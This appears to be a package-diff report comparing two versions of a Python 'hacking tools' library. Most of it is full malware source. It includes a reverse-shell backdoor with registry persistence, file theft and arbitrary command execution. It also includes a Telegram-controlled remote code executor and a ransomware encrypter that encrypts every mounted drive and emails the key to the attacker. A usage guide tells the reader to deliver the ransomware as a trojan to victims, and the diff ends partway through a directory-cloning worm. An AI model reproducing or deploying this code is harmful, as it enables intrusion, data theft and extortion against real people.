-				subprocess.call(f'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v {backdoor_name.removesuffix(".exe")} /t REG_SZ /d "{backdoor_file_path}"')
-
-
-	def connect_to_listener(self):
-		'''
-		description: tries to connect to attacker's machine untill connected successfully. 
-		params: None
-        returns: None
-		'''
-		connected = False
-		while not connected:
-			try:
-				self.connection.connect((self.ip,self.port))
-				connected = True
-				# self.serial_send('\r[*] Connection Established.')
-			except ConnectionRefusedError:
-				# print('\r[-] Connection Refused.', end='')
-				continue
-
-
-	def serial_send(self, data:str or list or bytes):
-		'''
-		description: serialize data and send over TCP socket.
-		params: data (str or list)
-        returns: None
-		'''
-		if type(data) == bytes:
-			data = str(data, encoding='utf-8')
-		
-		bytes_json_data = json.dumps(data).encode('utf-8')
-		# print('BD sent: ',bytes_json_data)
-		self.connection.send(bytes_json_data)
-
-
-	def serial_receive(self) -> str :
-		'''
-        description: receive serialized data over TCP socket
-        and retrieve original data.
-		params: None
-        returns: bytes
-		'''
-		bytes_json_data = b''
-		while True:
-			try:
-				bytes_json_data += self.connection.recv(1024)
-				data = json.loads(bytes_json_data)
-				# print("Backdoor Rec: ", data)
-				return data 
-			except json.JSONDecodeError:
-				continue
-
-
-	def execute_command(self,command:str)->str:
-		'''
-		description: executes command and return command's output.
-		params: command(str)
-        returns: str
-		'''
-		return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
-
-
-	def cwd(self,path):
-		'''
-		description: change working directory to the passed path.
-		params: path(str)
-        returns: str
-		'''
-		os.chdir(path)
-		return '[*] Path changed to ' + path
-
-
-	def upload_file(self, path):
-		'''
-		description: upload file contents to the attacker server.
-		params: path(str or bytes)
-        returns: bytes
-		'''
-		if os.path.isfile(path):
-			with open(path, 'rb') as file:
-				file_content = file.read()
-				base64_file_content = base64.b64encode(file_content)
-				return base64_file_content
-		else:
-			return f"[-] Exception : File {path} doesn't exist."
-
-
-	def write_file(self, path, content)->str:
-		'''
-		description: write downloaded contents from the victim 
-		to the specified path file.
-		params: path, content
-        returns: str
-		'''
-		with open(path, 'wb') as file:
-			bytes_content = base64.b64decode(content)
-			file.write(bytes_content)
-			return (f"[*] File {path} Downloaded successfully on Victim's machine.")
-	
-	
-	def upload_dir_files(self, path)->str:
-		r'''
-		uploads directory files to the hacker's machine. 
-		'''
-		if os.path.isdir(path):
-			dir_files = os.listdir(path)
-			files_count = str(len(dir_files))
-			self.serial_send(files_count)
-			# for file in dir_files:
-			# 	if os.path.isfile(file):
-			# 		self.upload_file(file)
-
-			# download is wrt hacker's machine
-			return f'[*] dir {path} files downloaded successfully.'
-		else:
-			return f'[-] Error while downloading dir {path} files'
-	
-	def run(self):
-		'''
-		description: start backdoor.
-		params: None
-        returns: None
-		'''
-		while True:
-			try:
-				command = self.serial_receive()
-				
-				# remove below line
-				command_lst = command.split(' ')
-				# print(command_lst)
-				command_list_len = len(command_lst)>=2
-				cmd = command_lst[0]
-				if command_list_len:
-					path = command_lst[1]
-				
-				# all these commands are wrt attacker.
-				if cmd == 'exit' :
-					self.serial_send("[!] Victim's connection has been closed.")
-					self.connection.close()
-					sys.exit()
-				
-				elif cmd == 'cd' and command_list_len:
-					command_output = self.cwd(path)
-				
-				elif cmd =='download' and command_list_len:
-					file_content = self.upload_file(path)
-					command_output = str(file_content, encoding='utf-8')
-
-				elif cmd == 'upload' and len(command_lst)==3:
-					file_contents = command_lst[2]
-					command_output = self.write_file(path, file_contents)
-				
-				elif command == 'download_dir_files' and command_list_len:
-					dir_name = path
-					command_output = self.upload_dir_files(dir_name)
-				else:
-					command_output = self.execute_command(command)
-
-				self.serial_send(command_output)
-
-			except json.JSONDecodeError:
-				print('[-] Lost Connection.')
-				self.connect_to_listener()
-
-			except Exception as e:
-				exception = ('[-] Exception : ' + str(e))
-				self.serial_send(exception)
-
-
-if __name__ == '__main__':
-	try :
-		backdoor = ReverseBackdoor(ip='127.0.0.1', port=4444)
-		backdoor.run()
-	except Exception as e:
-		print('Exception :',e)
+import socket
+import subprocess
+import json
+import sys
+import os
+import base64
+import shutil
+
+
+class ReverseBackdoor:
+	
+	def __init__(self, ip:str, port:int)->None:
+		'''
+		description: Reverse backdoor class creates a backdoor by connecting to the attacker's machine server through TCP socket. 
+		params: ip(str), port(int)
+		returns: None
+		'''
+		self.create_persistence()
+		
+		self.port = port 
+		self.ip = ip
+		
+		# creating a socket : socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)
+		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.connect_to_listener()
+		
+
+	def create_persistence(self, backdoor_name:str='MyBackdoor.exe'):
+		'''
+		description: tries to connect to user when machine restarts.
+		params: None
+        returns: None
+		'''
+		if os.name == 'nt':
+			# TODO: Change MyBackdoor to something less suspectful before creating exe
+			backdoor_file_path = f'{os.environ["appdata"]}\\{backdoor_name}'
+			if not os.path.exists(backdoor_file_path):
+				shutil.copy(sys.executable, backdoor_file_path)
+				subprocess.call(f'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v {backdoor_name.removesuffix(".exe")} /t REG_SZ /d "{backdoor_file_path}"')
+
+
+	def connect_to_listener(self):
+		'''
+		description: tries to connect to attacker's machine untill connected successfully. 
+		params: None
+        returns: None
+		'''
+		connected = False
+		while not connected:
+			try:
+				self.connection.connect((self.ip,self.port))
+				connected = True
+				# self.serial_send('\r[*] Connection Established.')
+			except ConnectionRefusedError:
+				# print('\r[-] Connection Refused.', end='')
+				continue
+
+
+	def serial_send(self, data:str or list or bytes):
+		'''
+		description: serialize data and send over TCP socket.
+		params: data (str or list)
+        returns: None
+		'''
+		if type(data) == bytes:
+			data = str(data, encoding='utf-8')
+		
+		bytes_json_data = json.dumps(data).encode('utf-8')
+		# print('BD sent: ',bytes_json_data)
+		self.connection.send(bytes_json_data)
+
+
+	def serial_receive(self) -> str :
+		'''
+        description: receive serialized data over TCP socket
+        and retrieve original data.
+		params: None
+        returns: bytes
+		'''
+		bytes_json_data = b''
+		while True:
+			try:
+				bytes_json_data += self.connection.recv(1024)
+				data = json.loads(bytes_json_data)
+				# print("Backdoor Rec: ", data)
+				return data 
+			except json.JSONDecodeError:
+				continue
+
+
+	def execute_command(self,command:str)->str:
+		'''
+		description: executes command and return command's output.
+		params: command(str)
+        returns: str
+		'''
+		return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
+
+
+	def cwd(self,path):
+		'''
+		description: change working directory to the passed path.
+		params: path(str)
+        returns: str
+		'''
+		os.chdir(path)
+		return '[*] Path changed to ' + path
+
+
+	def upload_file(self, path):
+		'''
+		description: upload file contents to the attacker server.
+		params: path(str or bytes)
+        returns: bytes
+		'''
+		if os.path.isfile(path):
+			with open(path, 'rb') as file:
+				file_content = file.read()
+				base64_file_content = base64.b64encode(file_content)
+				return base64_file_content
+		else:
+			return f"[-] Exception : File {path} doesn't exist."
+
+
+	def write_file(self, path, content)->str:
+		'''
+		description: write downloaded contents from the victim 
+		to the specified path file.
+		params: path, content
+        returns: str
+		'''
+		with open(path, 'wb') as file:
+			bytes_content = base64.b64decode(content)
+			file.write(bytes_content)
+			return (f"[*] File {path} Downloaded successfully on Victim's machine.")
+	
+	
+	def upload_dir_files(self, path)->str:
+		r'''
+		uploads directory files to the hacker's machine. 
+		'''
+		if os.path.isdir(path):
+			dir_files = os.listdir(path)
+			files_count = str(len(dir_files))
+			self.serial_send(files_count)
+			# for file in dir_files:
+			# 	if os.path.isfile(file):
+			# 		self.upload_file(file)
+
+			# download is wrt hacker's machine
+			return f'[*] dir {path} files downloaded successfully.'
+		else:
+			return f'[-] Error while downloading dir {path} files'
+	
+	def run(self):
+		'''
+		description: start backdoor.
+		params: None
+        returns: None
+		'''
+		while True:
+			try:
+				command = self.serial_receive()
+				
+				# remove below line
+				command_lst = command.split(' ')
+				# print(command_lst)
+				command_list_len = len(command_lst)>=2
+				cmd = command_lst[0]
+				if command_list_len:
+					path = command_lst[1]
+				
+				# all these commands are wrt attacker.
+				if cmd == 'exit' :
+					self.serial_send("[!] Victim's connection has been closed.")
+					self.connection.close()
+					sys.exit()
+				
+				elif cmd == 'cd' and command_list_len:
+					command_output = self.cwd(path)
+				
+				elif cmd =='download' and command_list_len:
+					file_content = self.upload_file(path)
+					command_output = str(file_content, encoding='utf-8')
+
+				elif cmd == 'upload' and len(command_lst)==3:
+					file_contents = command_lst[2]
+					command_output = self.write_file(path, file_contents)
+				
+				elif command == 'download_dir_files' and command_list_len:
+					dir_name = path
+					command_output = self.upload_dir_files(dir_name)
+				else:
+					command_output = self.execute_command(command)
+
+				self.serial_send(command_output)
+
+			except json.JSONDecodeError:
+				print('[-] Lost Connection.')
+				self.connect_to_listener()
+
+			except Exception as e:
+				exception = ('[-] Exception : ' + str(e))
+				self.serial_send(exception)
+
+
+if __name__ == '__main__':
+	try :
+		backdoor = ReverseBackdoor(ip='127.0.0.1', port=4444)
+		backdoor.run()
+	except Exception as e:
+		print('Exception :',e)
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/telegram_remote_code_executor/TelegramRemoteCodeExecutor.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/telegram_remote_code_executor/TelegramRemoteCodeExecutor.py`

 * *Ordering differences only*

 * *Files 20% similar despite different names*

```diff
@@ -1,154 +1,154 @@
-import telebot
-import os
-from telebot.types import Message as tele_message
-from subprocess import check_output
-
-
-# set API_KEY and CHAT_ID before starting bot
-API_KEY = 'your_bot_key/token'
-CHAT_ID = 0  # int - attacker's user id
-# to find user id, start the bot, and message this bot with /start
-
-
-# password = 'password' # reserved for future idea regarding authentication
-help_message = '''
-Remote Code Executor BOT 
-Written by Dhrumil Mistry
-https://github.com/dmdhrumilmistry
-
--------------------------
-command     description
--------------------------
-/start      get chat id and user details
-/help       get help menu
-/exec       execute command on victim's machine
-/cd <path>  change directory
-/ls         list file and folders of current working directory
-/download   download file from the victims machine to attacker's via telegram chat
-'''
-
-# might raise issue, need to update API value
-bot = telebot.TeleBot(API_KEY)
-
-
-def get_victim():
-    return check_output("whoami", shell=True).decode("utf-8")
-
-
-def inform_attacker():
-    '''
-    informs attacker that the victim machine is up
-    '''
-    message = f'{get_victim()} has been pawned and up'
-    bot.send_message(CHAT_ID, text=message)
-
-
-def get_user_details(message: tele_message):
-    '''
-    returns messenger's details
-    '''
-    return f'ID : {message.from_user.id}\n Name :{message.from_user.full_name}\n[UserName] {message.from_user.username}\nIS BOT : {message.from_user.is_bot}'
-
-
-def validate_request(message: tele_message) -> bool:
-    '''
-    returns True is if request is from hacker, else False 
-    '''
-    if message.from_user.id != int(CHAT_ID):
-        alert_message = f'[!] Intruder Alert!!\n{get_user_details(message)}\nTried Command : {message.text}\n\nDetailed Information :{message}'
-        bot.send_message(chat_id=CHAT_ID, text=alert_message)
-        bot.send_message(chat_id=message.from_user.id,
-                         text='Not Authorized !!')
-        return False
-
-    return True
-
-
-@bot.message_handler(commands=['start'])
-def start(message: tele_message):
-    '''
-    start conversation
-    '''
-    chat_id = message.chat.id
-    reply_message = get_user_details()
-    bot.send_message(chat_id, reply_message)
-    if CHAT_ID:
-        bot.send_message(CHAT_ID, reply_message)
-
-
-@bot.message_handler(commands=['exec'])
-def execute(message: tele_message):
-    '''
-    executes and returns result to the attacker
-    '''
-    if not validate_request(message):
-        return
-
-    cmd = message.text.split('/exec')[-1].strip()
-    try:
-        result = check_output(cmd, shell=True).decode('utf-8')
-    except Exception as e:
-        result = f'Exception Occurred : {e}'
-
-    bot.send_message(chat_id=CHAT_ID, text=result)
-
-
-@bot.message_handler(commands=['help'])
-def help(message: tele_message):
-    '''
-    prints help
-    '''
-    if validate_request(message):
-        bot.send_message(chat_id=CHAT_ID, text=help_message)
-
-
-@bot.message_handler(commands=['cd'])
-def cd(message: tele_message):
-    '''
-    change current working directory
-    '''
-    cd_dir = message.text.split('/cd')[-1].strip()
-
-    if not validate_request(message):
-        return
-
-    os.chdir(cd_dir)
-    bot.send_message(CHAT_ID, text=f'Current Directory : {os.getcwd()}')
-
-
-@bot.message_handler(commands=['ls'])
-def ls(message: tele_message):
-    '''
-    replies with list of all the folders and files in the dir to the attacker
-    '''
-    if not validate_request(message):
-        return
-    dirs = '\n'.join(os.listdir('.'))
-    bot.send_message(chat_id=CHAT_ID, text=dirs)
-
-
-@bot.message_handler(commands=['download'])
-def download_file(message: tele_message):
-    '''
-    downloads file from victim's machine to attacker's machine
-    '''
-    if not validate_request(message):
-        return
-
-    file_path = message.text.split('/download')[-1].strip()
-    if os.path.isfile(file_path):
-        with open(file_path, 'rb') as file:
-            file_data = file.read()
-            bot.send_document(chat_id=CHAT_ID, data=file_data,
-                              caption=f'[*] {file_path} downloaded from {get_victim()}')
-    else:
-        bot.send_message(
-            chat_id=CHAT_ID, text=f'[!] {file_path} does not exists.')
-
-
-def start_bot():
-    '''
-    starts bot and informs hacker that victim's machine is up
-    '''
-    inform_attacker()
-    bot.infinity_polling()
+import telebot
+import os
+from telebot.types import Message as tele_message
+from subprocess import check_output
+
+
+# set API_KEY and CHAT_ID before starting bot
+API_KEY = 'your_bot_key/token'
+CHAT_ID = 0  # int - attacker's user id
+# to find user id, start the bot, and message this bot with /start
+
+
+# password = 'password' # reserved for future idea regarding authentication
+help_message = '''
+Remote Code Executor BOT 
+Written by Dhrumil Mistry
+https://github.com/dmdhrumilmistry
+
+-------------------------
+command     description
+-------------------------
+/start      get chat id and user details
+/help       get help menu
+/exec       execute command on victim's machine
+/cd <path>  change directory
+/ls         list file and folders of current working directory
+/download   download file from the victims machine to attacker's via telegram chat
+'''
+
+# might raise issue, need to update API value
+bot = telebot.TeleBot(API_KEY)
+
+
+def get_victim():
+    return check_output("whoami", shell=True).decode("utf-8")
+
+
+def inform_attacker():
+    '''
+    informs attacker that the victim machine is up
+    '''
+    message = f'{get_victim()} has been pawned and up'
+    bot.send_message(CHAT_ID, text=message)
+
+
+def get_user_details(message: tele_message):
+    '''
+    returns messenger's details
+    '''
+    return f'ID : {message.from_user.id}\n Name :{message.from_user.full_name}\n[UserName] {message.from_user.username}\nIS BOT : {message.from_user.is_bot}'
+
+
+def validate_request(message: tele_message) -> bool:
+    '''
+    returns True is if request is from hacker, else False 
+    '''
+    if message.from_user.id != int(CHAT_ID):
+        alert_message = f'[!] Intruder Alert!!\n{get_user_details(message)}\nTried Command : {message.text}\n\nDetailed Information :{message}'
+        bot.send_message(chat_id=CHAT_ID, text=alert_message)
+        bot.send_message(chat_id=message.from_user.id,
+                         text='Not Authorized !!')
+        return False
+
+    return True
+
+
+@bot.message_handler(commands=['start'])
+def start(message: tele_message):
+    '''
+    start conversation
+    '''
+    chat_id = message.chat.id
+    reply_message = get_user_details()
+    bot.send_message(chat_id, reply_message)
+    if CHAT_ID:
+        bot.send_message(CHAT_ID, reply_message)
+
+
+@bot.message_handler(commands=['exec'])
+def execute(message: tele_message):
+    '''
+    executes and returns result to the attacker
+    '''
+    if not validate_request(message):
+        return
+
+    cmd = message.text.split('/exec')[-1].strip()
+    try:
+        result = check_output(cmd, shell=True).decode('utf-8')
+    except Exception as e:
+        result = f'Exception Occurred : {e}'
+
+    bot.send_message(chat_id=CHAT_ID, text=result)
+
+
+@bot.message_handler(commands=['help'])
+def help(message: tele_message):
+    '''
+    prints help
+    '''
+    if validate_request(message):
+        bot.send_message(chat_id=CHAT_ID, text=help_message)
+
+
+@bot.message_handler(commands=['cd'])
+def cd(message: tele_message):
+    '''
+    change current working directory
+    '''
+    cd_dir = message.text.split('/cd')[-1].strip()
+
+    if not validate_request(message):
+        return
+
+    os.chdir(cd_dir)
+    bot.send_message(CHAT_ID, text=f'Current Directory : {os.getcwd()}')
+
+
+@bot.message_handler(commands=['ls'])
+def ls(message: tele_message):
+    '''
+    replies with list of all the folders and files in the dir to the attacker
+    '''
+    if not validate_request(message):
+        return
+    dirs = '\n'.join(os.listdir('.'))
+    bot.send_message(chat_id=CHAT_ID, text=dirs)
+
+
+@bot.message_handler(commands=['download'])
+def download_file(message: tele_message):
+    '''
+    downloads file from victim's machine to attacker's machine
+    '''
+    if not validate_request(message):
+        return
+
+    file_path = message.text.split('/download')[-1].strip()
+    if os.path.isfile(file_path):
+        with open(file_path, 'rb') as file:
+            file_data = file.read()
+            bot.send_document(chat_id=CHAT_ID, data=file_data,
+                              caption=f'[*] {file_path} downloaded from {get_victim()}')
+    else:
+        bot.send_message(
+            chat_id=CHAT_ID, text=f'[!] {file_path} does not exists.')
+
+
+def start_bot():
+    '''
+    starts bot and informs hacker that victim's machine is up
+    '''
+    inform_attacker()
+    bot.infinity_polling()
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/utils.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/utils.py`

 * *Ordering differences only*

 * *Files 13% similar despite different names*

```diff
@@ -1,92 +1,92 @@
-from platform import system
-from sys import platform
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
-from time import time
-from os import chdir, remove
-
-
-import ctypes
-import os
-import shutil
-import smtplib
-import requests
-
-
-def send_mail(email: str, receiver_mails: list[str], password: str, message: str, smtp_server: str = 'smtp.gmail.com', smtp_port: int = 587, supress_exceptions: bool = True, zip_file_path: str = None) -> bool:
-    '''
-    sends mail to specific address/addresses.
-    '''
-    try:
-        if zip_file_path:
-            DESTINATION_ARCHIVE_NAME = zip_file_path
-            SUBJECT = "PyHTools Reported: {}".format(zip_file_path)
-
-            # separate emails using comma
-            RECIPIENTS = ','.join(receiver_mails)
-
-            msg = MIMEMultipart()
-            msg['Subject'] = SUBJECT
-            msg['From'] = email
-            msg['To'] = RECIPIENTS
-
-            part = MIMEBase("application", "octet-stream")
-            part.set_payload(open(DESTINATION_ARCHIVE_NAME, "rb").read())
-            encoders.encode_base64(part)
-            part.add_header("Content-Disposition",
-                            "attachment; filename=\"%s\"" % (DESTINATION_ARCHIVE_NAME))
-            msg.attach(part)
-            message = msg.as_string()
-
-        server = smtplib.SMTP(smtp_server, smtp_port)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, receiver_mails, message)
-        server.quit()
-        return True
-    except smtplib.SMTPException as e:
-        if not supress_exceptions:
-            print('[-] Exception : ', e)
-        return False
-
-
-def download(url: str) -> bool:
-    '''
-    description: download and save file from the url.
-    params: url
-    returns: bool
-    '''
-    try:
-        response = requests.get(url)
-        file_name = url.split('/')[-1]
-        with open(file_name, 'wb') as file:
-            file.write(response.content)
-        return True
-
-    except Exception as e:
-        print('[-] Exception : ', e)
-        return False
-
-
-def is_admin() -> bool:
-    is_admn = False
-    match system():
-        case 'Windows':
-            is_admn = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        case _:
-            from os import getuid
-            is_admn = getuid() == 0
-
-    return is_admn
-
-
-def check_os() -> str:
-    if platform in ['linux', 'linux2']:
-        return 'linux'
-    elif platform == 'darwin':
-        return 'macos'
-    elif platform == 'win32':
-        return 'windows'
-    else:
-        return 'unknown'
+from platform import system
+from sys import platform
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+from time import time
+from os import chdir, remove
+
+
+import ctypes
+import os
+import shutil
+import smtplib
+import requests
+
+
+def send_mail(email: str, receiver_mails: list[str], password: str, message: str, smtp_server: str = 'smtp.gmail.com', smtp_port: int = 587, supress_exceptions: bool = True, zip_file_path: str = None) -> bool:
+    '''
+    sends mail to specific address/addresses.
+    '''
+    try:
+        if zip_file_path:
+            DESTINATION_ARCHIVE_NAME = zip_file_path
+            SUBJECT = "PyHTools Reported: {}".format(zip_file_path)
+
+            # separate emails using comma
+            RECIPIENTS = ','.join(receiver_mails)
+
+            msg = MIMEMultipart()
+            msg['Subject'] = SUBJECT
+            msg['From'] = email
+            msg['To'] = RECIPIENTS
+
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(open(DESTINATION_ARCHIVE_NAME, "rb").read())
+            encoders.encode_base64(part)
+            part.add_header("Content-Disposition",
+                            "attachment; filename=\"%s\"" % (DESTINATION_ARCHIVE_NAME))
+            msg.attach(part)
+            message = msg.as_string()
+
+        server = smtplib.SMTP(smtp_server, smtp_port)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, receiver_mails, message)
+        server.quit()
+        return True
+    except smtplib.SMTPException as e:
+        if not supress_exceptions:
+            print('[-] Exception : ', e)
+        return False
+
+
+def download(url: str) -> bool:
+    '''
+    description: download and save file from the url.
+    params: url
+    returns: bool
+    '''
+    try:
+        response = requests.get(url)
+        file_name = url.split('/')[-1]
+        with open(file_name, 'wb') as file:
+            file.write(response.content)
+        return True
+
+    except Exception as e:
+        print('[-] Exception : ', e)
+        return False
+
+
+def is_admin() -> bool:
+    is_admn = False
+    match system():
+        case 'Windows':
+            is_admn = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        case _:
+            from os import getuid
+            is_admn = getuid() == 0
+
+    return is_admn
+
+
+def check_os() -> str:
+    if platform in ['linux', 'linux2']:
+        return 'linux'
+    elif platform == 'darwin':
+        return 'macos'
+    elif platform == 'win32':
+        return 'windows'
+    else:
+        return 'unknown'
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/ransomwares/dmsec/encrypter.py` & `pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/encrypter.py`

 * *Ordering differences only*

 * *Files 15% similar despite different names*

```diff
@@ -1,64 +1,64 @@
-from cryptography.fernet import Fernet
-from os import walk, environ
-from os.path import join
-from psutil import disk_partitions
-from pyhtools.evil_files.malwares.utils import send_mail
-
-
-class DMSecEncrypter:
-    def __init__(self, paths: list = None, email: str = None, passwd: str = None, smtp_server: str = 'smtp.gmail.com', smtp_port: int = 587) -> None:
-        # generate new key
-        self.KEY = Fernet.generate_key()
-        message = f'Subject: RNSMWARE ATTK has been initialized on {environ.get("COMPUTERNAME", None)}\n**KEY** {str(self.KEY, encoding="utf-8")}\n**OS** {environ.get("OS", None)}\n\n'
-
-        # report KEY to the attacker using email
-        if email != None and passwd != None and send_mail(email=email, password=passwd, receiver_mail=email, smtp_server=smtp_server, smtp_port=smtp_port):
-            pass
-        else:
-            # print error message and exit if key is not sent
-            print('[!] Try Again, Unable to connect')
-            exit()
-
-        # generate fernet obj for file encryption
-        self.fernet = Fernet(self.KEY)
-
-        if paths == None:
-            self.PATHS = self.__get_partitions_path()
-        else:
-            self.PATHS = paths
-
-    def __get_partitions_path(self) -> list:
-        '''
-        returns all mounted partition's mount points as a list
-        '''
-        mount_points = []
-        for partition in disk_partitions():
-            mount_points.append(partition.mountpoint)
-        return mount_points
-
-    def encrypt_file(self, file_path):
-        try:
-            # read file data
-            with open(file_path, 'rb') as f:
-                file_data = f.read()
-
-            # encrypt file data
-            enc_data = self.fernet.encrypt(file_data)
-
-            # write file data
-            with open(file_path, 'wb') as f:
-                file_data = f.write(enc_data)
-            return True
-
-        except Exception:
-            return False
-
-    def encrypt_files(self, path: str):
-        for root, dirs, files in walk(path):
-            for file in files:
-                file_path = join(root, file)
-                self.encrypt_file(file_path=file_path)
-
-    def start(self):
-        for path in self.PATHS:
-            self.encrypt_files(path)
+from cryptography.fernet import Fernet
+from os import walk, environ
+from os.path import join
+from psutil import disk_partitions
+from pyhtools.evil_files.malwares.utils import send_mail
+
+
+class DMSecEncrypter:
+    def __init__(self, paths: list = None, email: str = None, passwd: str = None, smtp_server: str = 'smtp.gmail.com', smtp_port: int = 587) -> None:
+        # generate new key
+        self.KEY = Fernet.generate_key()
+        message = f'Subject: RNSMWARE ATTK has been initialized on {environ.get("COMPUTERNAME", None)}\n**KEY** {str(self.KEY, encoding="utf-8")}\n**OS** {environ.get("OS", None)}\n\n'
+
+        # report KEY to the attacker using email
+        if email != None and passwd != None and send_mail(email=email, password=passwd, receiver_mail=email, smtp_server=smtp_server, smtp_port=smtp_port):
+            pass
+        else:
+            # print error message and exit if key is not sent
+            print('[!] Try Again, Unable to connect')
+            exit()
+
+        # generate fernet obj for file encryption
+        self.fernet = Fernet(self.KEY)
+
+        if paths == None:
+            self.PATHS = self.__get_partitions_path()
+        else:
+            self.PATHS = paths
+
+    def __get_partitions_path(self) -> list:
+        '''
+        returns all mounted partition's mount points as a list
+        '''
+        mount_points = []
+        for partition in disk_partitions():
+            mount_points.append(partition.mountpoint)
+        return mount_points
+
+    def encrypt_file(self, file_path):
+        try:
+            # read file data
+            with open(file_path, 'rb') as f:
+                file_data = f.read()
+
+            # encrypt file data
+            enc_data = self.fernet.encrypt(file_data)
+
+            # write file data
+            with open(file_path, 'wb') as f:
+                file_data = f.write(enc_data)
+            return True
+
+        except Exception:
+            return False
+
+    def encrypt_files(self, path: str):
+        for root, dirs, files in walk(path):
+            for file in files:
+                file_path = join(root, file)
+                self.encrypt_file(file_path=file_path)
+
+    def start(self):
+        for path in self.PATHS:
+            self.encrypt_files(path)
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/ransomwares/dmsec/HowToUse.md` & `pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/HowToUse.md`

 * *Ordering differences only*

 * *Files 15% similar despite different names*

```diff
@@ -1,31 +1,31 @@
-# How to use DMSecRansomware
-
-#### **Author**: [Dhrumil Mistry](https://github.com/dmdhrumilmistry)
-
-## Encrypting data
-- Turn on 2FA in attacker's gmail account.
-- Create app password
-- Update `dmsec_ransomware.py` with email and app password to login to your gmail account. This is used to receive key to decrypt the files.
-
-  ```python
-  encrypter = DMSECEncrypter(PATHS, gmail='yourgmailid', passwd='yourapppassword')
-  ```
-- Specify path which is to be encrypted.
-- If all the drives are to be decrypted do not pass PATHS to the DMSECEncrypter
-
-  ```python
-  encrypter = DMSECEncrypter(gmail='yourgmailid', passwd='yourapppassword')
-  ```
-- Create a trojan or use social engineering and send file to the victim.
-- Wait for victim to execute the trojan.
-
-
-## Decrypting Data
-- Use `decrypter.py` to decrypt the encrypted files.
-- Edit paths to be decrypted in `decrypter.py` file. If all the drives are to be decrypted do not pass PATHS to DMSECDecrypter
-
-  ```python
-  encrypter = DMSECDecrypter(KEY)
-  ```
-- Use the key which was received on mail to decrypt the data
-
+# How to use DMSecRansomware
+
+#### **Author**: [Dhrumil Mistry](https://github.com/dmdhrumilmistry)
+
+## Encrypting data
+- Turn on 2FA in attacker's gmail account.
+- Create app password
+- Update `dmsec_ransomware.py` with email and app password to login to your gmail account. This is used to receive key to decrypt the files.
+
+  ```python
+  encrypter = DMSECEncrypter(PATHS, gmail='yourgmailid', passwd='yourapppassword')
+  ```
+- Specify path which is to be encrypted.
+- If all the drives are to be decrypted do not pass PATHS to the DMSECEncrypter
+
+  ```python
+  encrypter = DMSECEncrypter(gmail='yourgmailid', passwd='yourapppassword')
+  ```
+- Create a trojan or use social engineering and send file to the victim.
+- Wait for victim to execute the trojan.
+
+
+## Decrypting Data
+- Use `decrypter.py` to decrypt the encrypted files.
+- Edit paths to be decrypted in `decrypter.py` file. If all the drives are to be decrypted do not pass PATHS to DMSECDecrypter
+
+  ```python
+  encrypter = DMSECDecrypter(KEY)
+  ```
+- Use the key which was received on mail to decrypt the data
+
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/worms/dir_cloner.py` & `pyhtools-2.2.2/pyhtools/evil_files/worms/dir_cloner.py`

 * *Ordering differences only*

 * *Files 24% similar despite different names*

```diff
@@ -1,137 +1,137 @@
-import os
-import shutil
-import threading
-import time
-
-
-class DirCloner:
-    def __init__(self, root:str='') -> None:
-        # set path
-        if os.path.exists(root):
-            self.root = root
-        else:
-            self.root = os.path.dirname(__file__)
-        
-        # set os
-        self.os_name = os.name
-    
-
-    def set_clone_path(self, path:str) -> bool:
-        '''
-        description:
-            set path of the folder which needs to be cloned by the worm.
-        
-        args:
-            path (str): path of the folder
-        
-        returns:
-            bool
-        '''
-        if os.path.exists(path):
-            self.root = path
-            return True
-        return False
-
-
-    def get_curr_drive_folder(self,):
-        '''
-        description:
-            returns current drive folder location
-
-        args:
-            None
-
-        returns:
-            str
-        '''
-        if self.os_name == "nt":
-            path_list = self.root.split('\\')
-        else:
-            path_list = self.root.split('/')
-        path = os.path.join(path_list[0], os.path.sep, path_list[1])
-        return path
-
-
-    def clone(self,  number:int, src:str=None, dst:str=None) -> bool:
-        '''
-        description:
-            copies src tree to dst tree with error handling
-
-        args:
-            number (int): number to be appended to src if dst is not provided
-            src (str): source path of dir to be cloned, default is None
-            dst (str): destination path of cloned directory, default is None
-
-        returns:
-            bool
-        '''
-        src = self.root if src is None else src
-                        
-        dst = src + str(number) if dst is None else dst
-        
-        if os.path.exists(dst):
-            return False
-
-        # print data for debugging
-        # print(number)
-        # print(src)
-        # print(dst)
-        # print('-'*40)
-
-        # if any error occurs return false
-        try:
-            shutil.copytree(src=src, dst=dst)
-        except Exception as e:
-            print(e)
-            return False
-        return True
-
-
-    def clone_all_dirs(self, path:str=None, start_after:int=0, times:int=1000) -> bool:
-        '''
-        description:
-            clones all the directories specified in the path for specified times.
-        
-        args:
-            path (str): path of the root directory, default is None (which will be updated to root dir passed during obj creation)
-            start_after (int): seconds after which worm needs to be started, default is 0s
-            times (str): number of clones to be created of a particular directory, default is 1000
-        
-        returns:
-            None
-        '''
-        if path is None:
-            path = self.root
-        
-        if not os.path.exists(path):
-            return False
-        
-        curr_path = os.getcwd()
-        os.chdir(path)
-        
-        dirs_list = os.listdir()
-        for dir in dirs_list:
-            clone_path = os.path.join(path, dir)
-            self.clone_dir(times=times, start_after=start_after, src=clone_path) 
-
-        os.chdir(curr_path)
-
-
-    def clone_dir(self, times:int=1000, start_after:int=0, src:str=None, dst:str=None) -> None:
-        '''
-        description:
-            waits for specified time and then starts cloning the dir for specified time.
-
